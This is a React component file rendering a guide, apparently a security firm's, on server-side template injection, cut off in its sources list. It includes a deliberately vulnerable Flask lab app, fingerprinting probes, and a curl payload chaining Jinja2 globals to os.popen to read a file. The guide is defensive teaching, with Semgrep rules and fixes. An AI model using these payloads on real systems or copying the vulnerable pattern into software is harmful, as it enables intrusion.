import { Helmet } from '@dr.pogodin/react-helmet';

const guideUrl = 'https://proksiabel.ee/guides/ssti-explained';

const techArticleSchema = {
  '@context': 'https://schema.org',
  '@type': 'TechArticle',
  headline: 'Server-Side Template Injection (SSTI) Explained: Attack Examples & Prevention',
  description:
    'Server-side template injection (SSTI) explained: how user input becomes template code, detection payloads, Jinja2 and FreeMarker RCE examples, a reproducible local lab, and prevention patterns.',
  datePublished: '2026-09-05',
  dateModified: '2026-09-05',
  inLanguage: 'en',
  mainEntityOfPage: guideUrl,
  author: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
  publisher: {
    '@type': 'Organization',
    name: 'ProksiAbel OÜ',
    url: 'https://proksiabel.ee/',
  },
};

/**
 * Technical guide component explaining server-side template injection (SSTI)
 * vulnerabilities, detection methods, exploitation examples, and prevention patterns.
 */
export default function SstiGuide() {
  return (
    <>
      <Helmet>
        <script type='application/ld+json'>{JSON.stringify(techArticleSchema)}</script>
      </Helmet>

      <div className='min-h-screen bg-slate-900 pt-24 pb-12'>
        <div className='max-w-4xl mx-auto px-4 sm:px-6 lg:px-8'>
          <p className='text-sm uppercase tracking-wide text-sky-400 font-semibold mb-4'>
            Technical Guide
          </p>
          <h1 className='text-3xl md:text-4xl font-bold text-white mb-6'>
            Server-Side Template Injection (SSTI) Explained: Attack Examples &amp; Prevention
          </h1>
          <p className='text-slate-400 text-lg leading-relaxed mb-10'>
            Server-side template injection (SSTI) lets an attacker inject native template syntax
            into a template that the server then evaluates. It arises when user input is
            concatenated into the template string instead of being passed in as data, and it
            routinely escalates to remote code execution (CWE-1336). This guide covers the
            mechanics, a reproducible local lab, detection, and fixes.
          </p>

          <div className='max-w-none text-slate-300'>
            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                What server-side template injection is and why it keeps mattering
              </h2>
              <p className='leading-relaxed mb-4'>
                Template engines generate pages by merging a fixed template with volatile data:
                Jinja2 (Python), Twig (PHP), FreeMarker and Velocity (Java), ERB (Ruby), Mako
                (Python), and Thymeleaf (Java) are common examples. PortSwigger&apos;s definition is
                the one auditors work from: server-side template injection is when an attacker is
                able to use native template syntax to inject a malicious payload into a template,
                which is then executed server-side. The weakness is CWE-1336 (Improper
                Neutralization of Special Elements Used in a Template Engine), a child of CWE-94
                (Improper Control of Generation of Code) — at its core it is a code-injection bug,
                not an output-encoding bug. OWASP groups it in the injection family (A05:2025
                Injection, which maps 37 CWEs).
              </p>
              <p className='leading-relaxed mb-4'>
                The class was first documented by PortSwigger Research&apos;s James Kettle in 2015
                (Black Hat USA, &quot;Server-Side Template Injection: RCE for the Modern Web
                App&quot;). Before that research, template injection was routinely misread as XSS —
                CWE&apos;s own description notes that XSS-style attacks can obscure the root cause
                when the developer does not investigate the error closely. The confusion matters
                because the two have opposite fixes: XSS is fixed by escaping output, while SSTI
                must be fixed by keeping user input out of template source.
              </p>
              <p className='leading-relaxed mb-4'>
                Three real cases show the range — all unauthenticated, all CVSS 9.8, and the two
                most recent confirmed exploited in the wild via CISA&apos;s Known Exploited
                Vulnerabilities catalog:
              </p>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Incident</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>
                        Template injection role
                      </th>
                      <th className='py-3 text-slate-100 font-semibold'>Outcome</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>CVE-2019-16759, vBulletin 5.x</td>
                      <td className='py-3 pr-4 align-top'>
                        Template/code injection through the{' '}
                        <code className='text-slate-100'>widgetConfig[code]</code> parameter in an{' '}
                        <code className='text-slate-100'>ajax/render/widget_php</code> request gives
                        unauthenticated remote code execution.
                      </td>
                      <td className='py-3 align-top'>
                        Affects vBulletin 5.x through 5.5.4; CVSS 9.8 with no privileges or user
                        interaction required; NVD publish date 24 September 2019.
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        CVE-2022-22954, VMware Workspace ONE Access
                      </td>
                      <td className='py-3 pr-4 align-top'>
                        Server-side template injection in the identity-management appliance leads to
                        remote code execution for any network-reachable actor.
                      </td>
                      <td className='py-3 align-top'>
                        CVSS 9.8; exploited in the wild and added to the CISA KEV catalog on
                        2022-04-14, three days after disclosure.
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        CVE-2024-4879, ServiceNow Now Platform
                      </td>
                      <td className='py-3 pr-4 align-top'>
                        Jelly template injection in UI macros lets an unauthenticated user execute
                        code within the Now Platform context.
                      </td>
                      <td className='py-3 align-top'>
                        CVSS 9.8; publicly exploited in July 2024 across ServiceNow instances and
                        added to the CISA KEV catalog on 2024-07-29.
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <p className='leading-relaxed'>
                The pattern across all three: a vendor product with a template/scripting surface
                that accepted untrusted input as template source. None of these required a sandbox
                bypass — the sandbox was absent or the injection point sat outside it.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                SSTI attack anatomy: when input becomes template source
              </h2>
              <p className='leading-relaxed mb-4'>
                The security boundary is a single conceptual rule:{' '}
                <em>the template is code, the data model is data</em>. Passing user input as a data
                value is safe. Concatenating user input into the template string makes the user a
                template author. PortSwigger contrasts the two with Twig:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`// Safe: the user's first name is passed in as data.
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name));

// Vulnerable: part of the template itself is built from the GET parameter.
$output = $twig->render("Dear " . $_GET['name']);`}
              </pre>
              <p className='leading-relaxed mb-4'>
                The same bug in Python/Flask — the canonical example used by the OWASP Web Security
                Testing Guide (WSTG-INPV-18) — looks like this:
              </p>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`@app.route("/page")
def page():
    name = request.values.get('name')
    output = Jinja2.from_string('Hello ' + name + '!').render()
    return output`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Because the engine evaluates template syntax server-side, a request like{' '}
                <code className='text-slate-100'>{'name={{7*7}}'}</code> returns{' '}
                <code className='text-slate-100'>Hello 49!</code> — proof the math ran on the
                server, not in a browser.
              </p>
              <p className='leading-relaxed mb-4'>
                Vulnerabilities appear in two contexts, and detection differs for each:
              </p>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  <strong className='text-sky-400'>Plaintext context</strong> — user input is
                  written directly into the template body (the examples above). Test by injecting a
                  math expression in the syntax of each engine and watching for server-side
                  evaluation.
                </li>
                <li>
                  <strong className='text-sky-400'>Code context</strong> — user input is placed
                  inside a template expression rather than in the template body, for example as a
                  user-controllable variable name:{' '}
                  <code className='text-slate-100'>
                    {'engine.render("Hello {{" + greeting + "}}", data)'}
                  </code>
                  . A URL like <code className='text-slate-100'>{'?greeting=data.username'}</code>{' '}
                  renders <code className='text-slate-100'>Hello Carlos</code>. This context is
                  easily missed: there is no obvious XSS and it is almost indistinguishable from a
                  hashmap lookup (PortSwigger). Test by first confirming the parameter is not
                  directly XSS-able ( <code className='text-slate-100'>{'data.username<tag>'}</code>{' '}
                  produces blank, encoded, or errored output), then break out of the statement with
                  common template syntax:{' '}
                  <code className='text-slate-100'>{'data.username}}<tag>'}</code> rendering{' '}
                  <code className='text-slate-100'>Hello Carlos&lt;tag&gt;</code> confirms server-
                  side template injection.
                </li>
              </ul>
              <p className='leading-relaxed'>
                Once an expression evaluates, the attacker has the engine&apos;s object model. In
                unsandboxed engines that commonly means arbitrary file read and remote code
                execution; in sandboxed ones it may still mean internal-object access, file path
                traversal, or sensitive data exposure through developer-supplied objects.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Template-engine fingerprinting: first probes by engine
              </h2>
              <p className='leading-relaxed mb-4'>
                After detecting evaluation, identify the engine. Error messages often give it away
                directly — submitting <code className='text-slate-100'>{'<%=foobar%>'}</code> to a
                Ruby ERB endpoint returns a NameError that names{' '}
                <code className='text-slate-100'>erb.rb</code>. Otherwise probe with arithmetic in
                each engine&apos;s syntax and disambiguate with a second payload, because one
                payload can succeed in several languages:{' '}
                <code className='text-slate-100'>{'{{7*7}}'}</code> returns 49 in both Twig and
                Jinja2.
              </p>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Engine</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Family</th>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Probe</th>
                      <th className='py-3 text-slate-100 font-semibold'>Distinguishing result</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Jinja2</td>
                      <td className='py-3 pr-4 align-top'>Python</td>
                      <td className='py-3 pr-4 align-top'>
                        <code className='text-slate-100'>{'{{7*7}}'}</code>
                      </td>
                      <td className='py-3 align-top'>
                        <code className='text-slate-100'>{"{{7*'7'}}"}</code> →{' '}
                        <code className='text-slate-100'>7777777</code> (string repetition)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Twig</td>
                      <td className='py-3 pr-4 align-top'>PHP</td>
                      <td className='py-3 pr-4 align-top'>
                        <code className='text-slate-100'>{'{{7*7}}'}</code>
                      </td>
                      <td className='py-3 align-top'>
                        <code className='text-slate-100'>{"{{7*'7'}}"}</code> →{' '}
                        <code className='text-slate-100'>49</code> (PHP coerces to integer)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>FreeMarker</td>
                      <td className='py-3 pr-4 align-top'>Java</td>
                      <td className='py-3 pr-4 align-top'>
                        <code className='text-slate-100'>{'$' + '{7*7}'}</code>
                      </td>
                      <td className='py-3 align-top'>
                        Directives too:{' '}
                        <code className='text-slate-100'>{'<#assign x=7*7>' + '$' + '{x}'}</code>{' '}
                        renders 49
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Velocity</td>
                      <td className='py-3 pr-4 align-top'>Java</td>
                      <td className='py-3 pr-4 align-top'>
                        <code className='text-slate-100'>{'#set($x=7*7)$x'}</code>
                      </td>
                      <td className='py-3 align-top'>Renders 49 from the assignment directive</td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>ERB</td>
                      <td className='py-3 pr-4 align-top'>Ruby</td>
                      <td className='py-3 pr-4 align-top'>
                        <code className='text-slate-100'>{'<%= 7*7 %>'}</code>
                      </td>
                      <td className='py-3 align-top'>
                        Renders 49; invalid input raises an erb.rb NameError
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Mako</td>
                      <td className='py-3 pr-4 align-top'>Python</td>
                      <td className='py-3 pr-4 align-top'>
                        <code className='text-slate-100'>{'$' + '{7*7}'}</code>
                      </td>
                      <td className='py-3 align-top'>
                        Native code blocks:{' '}
                        <code className='text-slate-100'>{'<% import os %>'}</code> executes
                        directly in unsandboxed environments
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>Thymeleaf / SpEL</td>
                      <td className='py-3 pr-4 align-top'>Java</td>
                      <td className='py-3 pr-4 align-top'>
                        <code className='text-slate-100'>
                          {'$' + '{T(java.lang.System).getenv()}'}
                        </code>
                      </td>
                      <td className='py-3 align-top'>
                        The T() type operator reaches static Java APIs
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <p className='leading-relaxed'>
                The Velocity/FreeMarker rows carry a general lesson from OWASP: expression syntax is
                not the only surface. Directive syntax ({' '}
                <code className='text-slate-100'>#set(...)</code>,{' '}
                <code className='text-slate-100'>{'<#assign ...>'}</code>) stores results instead of
                printing them, so probes must pair a directive with an interpolation to make the
                effect observable — and blind payloads should confirm execution with an out-of-band
                DNS lookup or a measurable delay, since an unchanged response is not evidence that
                nothing ran.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                Reproducible local lab: Jinja2 SSTI to file read
              </h2>
              <p className='leading-relaxed mb-4'>
                Everything below runs against local containers on your machine — no live targets, no
                weaponized payloads. The lab is a Flask app with a vulnerable greeting endpoint, a
                fixed endpoint, and a flag file. All payloads in this section were verified against
                Flask 3.1 / Jinja2 3.1 before publishing.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>docker-compose.yml</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`services:
  app:
    build: .
    ports:
      - "8080:8080"`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Dockerfile</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`FROM python:3.12-slim
WORKDIR /app
RUN pip install --no-cache-dir flask
RUN echo "flag{local-ssti-verified}" > /flag
COPY app.py .
EXPOSE 8080
CMD ["python", "app.py"]`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                app.py — vulnerable and fixed endpoints side by side
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.get("/greet")
def greet():
    """VULNERABLE: user input is concatenated into the template source."""
    name = request.args.get("name", "world")
    return render_template_string("Hello " + name + "!")


@app.get("/greet-fixed")
def greet_fixed():
    """FIXED: template source is constant; user input is passed as data."""
    name = request.args.get("name", "world")
    return render_template_string("Hello {{ name }}!", name=name)


app.run(host="0.0.0.0", port=8080)`}
              </pre>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>Run it and exploit it</h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`docker compose up --build

# 1. Detection — a math expression evaluated server-side proves SSTI.
curl -G 'http://localhost:8080/greet' --data-urlencode 'name={{7*7}}'
# Hello 49!

# 2. Engine identification — string repetition only makes sense to Jinja2.
curl -G 'http://localhost:8080/greet' --data-urlencode "name={{7*'7'}}"
# Hello 7777777!        (Twig would answer 49)

# 3. Exploitation — walk Python objects to os.popen and read the flag file.
curl -G 'http://localhost:8080/greet' --data-urlencode \\
  "name={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"
# Hello flag{local-ssti-verified}!`}
              </pre>
              <p className='leading-relaxed mb-4'>
                Step 3 deserves a trace, because this is the part people copy wrong:{' '}
                <code className='text-slate-100'>config</code> is a Flask-provided template global
                (a <code className='text-slate-100'>flask.config.Config</code> instance) whose class
                defines <code className='text-slate-100'>__init__</code> in Python, so{' '}
                <code className='text-slate-100'>__globals__</code> exists on it and points at the{' '}
                <code className='text-slate-100'>flask.config</code> module namespace, which imports{' '}
                <code className='text-slate-100'>os</code>. From there it is ordinary Python:{' '}
                <code className='text-slate-100'>os.popen(&apos;cat /flag&apos;).read()</code>. On
                non-Flask Jinja2 you chain through a different Python-defined global (for example{' '}
                <code className='text-slate-100'>cycler.__init__.__globals__</code>) or walk{' '}
                <code className='text-slate-100'>__subclasses__()</code> — the technique is the
                same: find any Python function reachable from a template global and read its{' '}
                <code className='text-slate-100'>__globals__</code>.
              </p>
              <p className='leading-relaxed mb-4'>
                The fixed endpoint renders the same payload inert —{' '}
                <code className='text-slate-100'>{'{{7*7}}'}</code> appears literally as text,
                because the input is a data value, never parsed as template syntax. Note that
                autoescaping is <em>not</em> the control that saved it: Flask 3 enables autoescaping
                for string templates, and the SSTI payload still executed on the vulnerable endpoint
                with autoescaping active. Autoescaping neutralizes XSS; it does nothing against
                template evaluation, which is exactly why SSTI gets misread as an encoding problem.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                How to detect server-side template injection
              </h2>
              <p className='leading-relaxed mb-4'>
                Detection is a three-step funnel: find candidate inputs, confirm server-side
                evaluation, identify the engine.
              </p>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  <strong className='text-sky-400'>Candidate inputs</strong> — any value that is
                  reflected inside a formatted message: personalized emails, greetings,
                  invoice/receipt templates, wiki or CMS pages, marketing builders, error templates,
                  and any feature where a privileged user can edit markup.
                </li>
                <li>
                  <strong className='text-sky-400'>Fuzz for evaluation</strong> — first send a
                  metacharacter sequence such as{' '}
                  <code className='text-slate-100'>{'$' + "{{<%[%'" + '}}%\\'}</code> and watch for
                  an exception, then probe math expressions per engine (table above). In plaintext
                  context a rendered <code className='text-slate-100'>Hello 49</code> is proof.
                  OWASP also suggests prefix probes like{' '}
                  <code className='text-slate-100'>{'a{{7*7}}'}</code> so a false-positive
                  reflection is easy to spot, and reminds testers to cover directive syntax for
                  Velocity/FreeMarker.
                </li>
                <li>
                  <strong className='text-sky-400'>Confirm the engine</strong> — error messages
                  first, then disambiguating payloads ({'{'}&quot;{"{{7*'7'}}"}&quot; →{' '}
                  <code className='text-slate-100'>49</code> vs{' '}
                  <code className='text-slate-100'>7777777</code>
                  {'}'}), then engine documentation for dangerous built-ins.
                </li>
              </ul>
              <p className='leading-relaxed mb-4'>
                Tools that automate detection and exploitation: SSTImap (actively maintained), its
                unmaintained predecessor Tplmap, and the Backslash Powered Scanner Burp extension;
                PayloadsAllTheThings maintains the reference payload list. A single Burp Intruder
                request with the payload list per parameter is the fastest manual sweep.
              </p>

              <h3 className='text-lg text-sky-400 font-medium mb-3'>
                SAST: Semgrep taint rule template
              </h3>
              <pre className='bg-slate-800 border border-slate-700 rounded-lg p-4 overflow-x-auto text-sm text-slate-200 mb-4'>
                {`rules:
  - id: python-flask-ssti-tainted-template
    mode: taint
    message: >
      Request data flows into a template string that is rendered with
      render_template_string. If the data is concatenated into the source,
      this is server-side template injection (CWE-1336). Pass it as a
      context variable instead.
    severity: ERROR
    languages: [python]
    pattern-sources:
      - pattern: request.$ARG
      - pattern: request.values.get(...)
      - pattern: request.args.get(...)
      - pattern: request.form.get(...)
      - pattern: request.json.get(...)
    pattern-sinks:
      - pattern: render_template_string(...)
      - pattern: from_string(...)
    pattern-sanitizers:
      - pattern: escape(...)
      - pattern: markupsafe.escape(...)`}
              </pre>
              <p className='leading-relaxed mb-4'>
                This is a starting rule, not a finished policy: it flags any request data reaching{' '}
                <code className='text-slate-100'>render_template_string</code>, which is the right
                failure mode for a codebase audit (that sink should never receive request data at
                all). Tune the source list to your framework and add sinks per language — Java
                FreeMarker/Thymeleaf, PHP Twig, Ruby ERB each need their own sink list. A cheap
                complement is a repo-wide grep audit for template-string sinks fed by concatenation:{' '}
                <code className='text-slate-100'>render_template_string(</code>,{' '}
                <code className='text-slate-100'>env.from_string(</code>,{' '}
                <code className='text-slate-100'>Template(</code> +{' '}
                <code className='text-slate-100'>+</code> operator,{' '}
                <code className='text-slate-100'>$twig-&gt;render(</code> with a non-literal first
                argument.
              </p>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>
                How to prevent server-side template injection
              </h2>
              <p className='leading-relaxed mb-4'>
                The fix is structural, not a filter:{' '}
                <em>user input must never become template source</em>. Every other control is
                defense in depth.
              </p>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  <strong className='text-sky-400'>
                    Keep templates static; pass data via the context.
                  </strong>{' '}
                  The fixed endpoint in the lab is the whole pattern:{' '}
                  <code className='text-slate-100'>
                    render_template_string(&quot;Hello {'{{'} name {'}}'}&quot;, name=name)
                  </code>
                  . The same shape applies in every engine — Twig&apos;s data-array render, Java
                  template processing with a data model, ERB with binding locals.
                </li>
                <li>
                  <strong className='text-sky-400'>Treat template selection as code too.</strong> If
                  the application picks a template by name from user input, an attacker can reach
                  templates they were never meant to load. Resolve names through an allowlist map,
                  never through a user-supplied path or name.
                </li>
                <li>
                  <strong className='text-sky-400'>A sandbox is not a security boundary.</strong>{' '}
                  Jinja2&apos;s <code className='text-slate-100'>SandboxedEnvironment</code>{' '}
                  intercepts attribute access — it raises SecurityError on{' '}
                  <code className='text-slate-100'>{'{{ func.__code__ }}'}</code> — but the
                  documentation is explicit that the sandbox alone is not a solution for perfect
                  security, and recommends resource limits plus passing only the data relevant to
                  the template. FreeMarker&apos;s guidance for untrusted templates is the same
                  philosophy from the Java side: control the object wrapper and member access policy
                  centrally, keep <code className='text-slate-100'>?api</code> disabled, and
                  restrict the new built-in. Sandboxes raise the bar; they do not make
                  user-authored-template features safe by themselves.
                </li>
                <li>
                  <strong className='text-sky-400'>Treat templates as source code.</strong>{' '}
                  FreeMarker&apos;s documentation is blunt: do not allow untrusted users to upload
                  templates at all, unless those users are application developers or system
                  administrators — templates are part of the source code, like{' '}
                  <code className='text-slate-100'>*.java</code> files. Any feature that lets a
                  non-admin submit template markup is a design-level SSTI risk.
                </li>
                <li>
                  <strong className='text-sky-400'>
                    Escape output, but do not confuse escaping with the fix.
                  </strong>{' '}
                  Autoescaping (Jinja2/Twig on by default for HTML templates, FreeMarker 2.3.24+)
                  prevents the XSS half of the bug. It does not prevent template evaluation, so a
                  template-injection sink stays an RCE sink even with perfect escaping.
                </li>
                <li>
                  <strong className='text-sky-400'>
                    Keep engines patched and audit the documentation&apos;s security sections.
                  </strong>{' '}
                  PortSwigger&apos;s methodology for both attack and audit starts with the
                  engine&apos;s own documentation, which usually lists the dangerous built-ins —
                  that list doubles as a checklist of what to forbid or review in your own
                  templates.
                </li>
              </ul>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>SSTI prevention checklist</h2>
              <div className='overflow-x-auto mb-4'>
                <table className='w-full text-sm text-left border-collapse'>
                  <thead>
                    <tr className='border-b border-slate-700'>
                      <th className='py-3 pr-4 text-slate-100 font-semibold'>Check</th>
                      <th className='py-3 text-slate-100 font-semibold'>How to verify</th>
                    </tr>
                  </thead>
                  <tbody className='text-slate-300'>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        No user input is concatenated into template source
                      </td>
                      <td className='py-3 align-top'>
                        Semgrep taint rule in CI (template above); grep audit for
                        render_template_string / from_string / Template() fed by request data
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        User-controlled template names/selection resolved via allowlist only
                      </td>
                      <td className='py-3 align-top'>
                        Code review of every dynamic template lookup; no request value reaches the
                        loader
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        No untrusted users can author or upload templates
                      </td>
                      <td className='py-3 align-top'>
                        Feature review: template-editing surfaces restricted to trusted roles;
                        rendered markup never re-parsed as template source
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        Autoescaping enabled for the output context
                      </td>
                      <td className='py-3 align-top'>
                        Engine config review (Flask file/string defaults, Twig autoescape,
                        FreeMarker auto-escaping); XSS test with{' '}
                        <code className='text-slate-100'>{'<b>x</b>'}</code> input
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        Sandboxed/restricted environments used only with a threat model, never as
                        the sole control
                      </td>
                      <td className='py-3 align-top'>
                        Confirm resource limits and minimal data-model exposure (Jinja2 sandbox
                        docs, FreeMarker object wrapper / member access policy)
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        Engine versions current; security advisories monitored
                      </td>
                      <td className='py-3 align-top'>
                        Dependency scan; engine changelogs reviewed for sandbox/bypass fixes
                      </td>
                    </tr>
                    <tr className='border-b border-slate-800'>
                      <td className='py-3 pr-4 align-top'>
                        QA sweeps user-markup features with SSTI payloads before release
                      </td>
                      <td className='py-3 align-top'>
                        Regression test: probe every message/template feature with{' '}
                        <code className='text-slate-100'>{'{{7*7}}'}</code>,{' '}
                        <code className='text-slate-100'>{'$' + '{7*7}'}</code>,{' '}
                        <code className='text-slate-100'>{'<%= 7*7 %>'}</code>; assert literal
                        output
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            <section className='mb-10'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Key takeaways</h2>
              <ul className='list-disc list-inside space-y-2 mb-4'>
                <li>
                  SSTI happens when user input is concatenated into a template instead of passed as
                  data; the attacker becomes a template author and the server evaluates their
                  payload (CWE-1336, child of CWE-94).
                </li>
                <li>
                  Impact is routinely catastrophic: vBulletin (2019, template/code injection, CVSS
                  9.8), VMware Workspace ONE Access (2022, SSTI to RCE) and ServiceNow (2024, Jelly
                  template injection) were all unauthenticated and CVSS 9.8 — the two most recent
                  are confirmed exploited in the wild in CISA&apos;s KEV catalog.
                </li>
                <li>
                  Detection is math: <code className='text-slate-100'>{'{{7*7}}'}</code> →{' '}
                  <code className='text-slate-100'>49</code> server-side proves evaluation;{' '}
                  <code className='text-slate-100'>{"{{7*'7'}}"}</code> (7777777 vs 49) fingerprints
                  Jinja2 vs Twig. Cover directive syntax and code context, and treat unchanged
                  responses as inconclusive, not clean.
                </li>
                <li>
                  The fix is structural: static template source, user input as data, allowlisted
                  template selection, no untrusted template authors. Autoescaping stops XSS but
                  never stops template evaluation, and a sandbox is defense in depth, not a
                  boundary.
                </li>
                <li>
                  SSTI is regularly misdiagnosed as XSS. The tell is server-side evaluation of
                  native template syntax — test for it explicitly on every user-markup feature.
                </li>
              </ul>
            </section>

            <section className='mb-10 border-t border-slate-800 pt-8'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Kokkuvõte eesti keeles</h2>
              <p className='leading-relaxed mb-4'>
                Server-side template injection (SSTI) on veebirakenduse nõrkus, kus ründaja sisestab
                templiidimootori enda süntaksi (näiteks{' '}
                <code className='text-slate-100'>{'{{7*7}}'}</code>) rakenduse templiidi sisse ning
                server arvutab selle täisõigusega käivitades. Põhjus on peaaegu alati sama: kasutaja
                sisend liidetakse templiidi lähtekoodi külge (näiteks{' '}
                <code className='text-slate-100'>
                  render_template_string(&quot;Hello &quot; + name)
                </code>
                ) selle asemel, et anda see edasi andmena. Nii saab ründaja täita suvalist koodi —
                lugeda faile või käivitada käske serveris (CWE-1336). Reaalseid juhtumeid on palju:
                vBulletin 2019, VMware Workspace ONE 2022 ja ServiceNow 2024 — kõik autentimiseta,
                CVSS 9.8 ja CISA KEV nimekirjas. Parandus on struktuurne: templiit peab olema
                staatiline lähtekood, kasutaja sisend antakse edasi ainult andmena, kasutaja valitud
                templiidinimed lubatakse ainult nimekirja kaudu ning templiite ei tohi lasta
                koostada volitamata kasutajatel. Automaatne väljundi eskapeerimine (autoescape)
                kaitseb XSS-i eest, kuid ei peata templiidi täitmist — seepärast ei tohi seda SSTI
                parandusena käsitleda. Täielik laborikäik ja koodinäited on ülal inglise keeles.
              </p>
            </section>

            <section className='mb-10 border-t border-slate-800 pt-8'>
              <h2 className='text-xl text-sky-500 font-semibold mb-4'>Sources</h2>
              <ul className='list-disc list-inside space-y-1 text-sm'>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cwe.mitre.org/data/definitions/1336.html'
                  >
                    CWE-1336 — Improper Neutralization of Special Elements Used in a Template Engine
                  </a>{' '}
                  (child of{' '}
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://cwe.mitre.org/data/definitions/94.html'
                  >
                    CWE-94
                  </a>
                  )
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://portswigger.net/web-security/server-side-template-injection'
                  >
                    PortSwigger Web Security Academy — server-side template injection
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://portswigger.net/web-security/server-side-template-injection/exploiting'
                  >
                    PortSwigger — exploiting SSTI vulnerabilities (methodology, Mako/ERB/Velocity
                    examples)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://portswigger.net/research/server-side-template-injection'
                  >
                    James Kettle (PortSwigger Research), &quot;Server-Side Template Injection: RCE
                    for the Modern Web App&quot; (2015, Black Hat USA)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://owasp.org/www-project-web-security-testing-guide/'
                  >
                    OWASP Web Security Testing Guide — WSTG-INPV-18 Testing for Server-side Template
                    Injection
                  </a>
                </li>
                <li>
                  <a className='text-sky-400 hover:text-sky-300' href='https://owasp.org/Top10/'>
                    OWASP Top 10:2025 — A05 Injection
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2019-16759'
                  >
                    NVD — CVE-2019-16759 (vBulletin 5.x)
                  </a>
                  ;{' '}
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2022-22954'
                  >
                    CVE-2022-22954 (VMware Workspace ONE Access)
                  </a>
                  ;{' '}
                  <a
                    className='text-sky-400 hover:text-sky-300'
                    href='https://nvd.nist.gov/vuln/detail/CVE-2024-4879'
                  >
                    CVE-2024-4879 (ServiceNow)
                  </a>
                </li>
                <li>
                  <a
                    className='text-sky-400 hover:text-sky-300'
